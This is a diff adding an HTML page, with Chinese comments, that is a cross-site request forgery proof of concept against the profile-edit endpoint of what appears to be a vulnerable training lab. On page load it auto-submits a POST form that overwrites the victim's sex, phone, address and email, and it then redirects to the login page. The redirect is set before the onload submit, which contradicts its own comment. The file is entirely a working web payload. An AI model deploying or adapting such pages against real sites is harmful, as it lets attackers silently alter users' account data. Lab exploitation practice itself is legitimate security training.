@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>修改信息</title>
+    </head>
+    <script>
+        // 页面加载时自动提交当前表单
+        window.onload = function () {
+            document.getElementById("postsubmit").click();
+        };
+        // 提交表单后重定向去个安全页面
+        window.location.href =
+            "http://[host]:[port]/vul/csrf/csrfpost/csrf_post_login.php";
+    </script>
+    <body>
+        <!-- 包含恶意 payload 的表单(将在页面加载时自动提交) -->
+        <form
+            method="post"
+            action="http://[host]:[port]/vul/csrf/csrfpost/csrf_post_edit.php"
+        >
+            <input type="text" name="sex" value="ChangeSex" />
+            <input type="text" name="phonenum" value="ChangePhoneNum" />
+            <input type="text" name="add" value="ChangeAddress" />
+            <input type="text" name="email" value="ChangeEmail" />
+
+            <input id="postsubmit" type="submit" name="submit" value="submit" />
+        </form>
+    </body>
+</html>
